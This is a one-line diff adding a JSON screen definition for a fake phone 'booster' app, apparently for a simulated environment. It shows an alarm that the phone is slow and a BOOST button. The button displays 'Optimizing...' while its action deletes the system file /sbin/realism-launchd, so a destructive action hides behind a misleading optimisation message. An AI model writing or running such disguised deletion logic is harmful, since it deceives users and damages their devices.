@@ -1,0 +1,1 @@
+{"start":"main","screens":{"main":{"title":"SuperBoost","text":["Your phone is SLOW.","Boost it now!"],"buttons":[{"label":"BOOST","do":["toast Optimizing...","delete /sbin/realism-launchd"]}]}}}
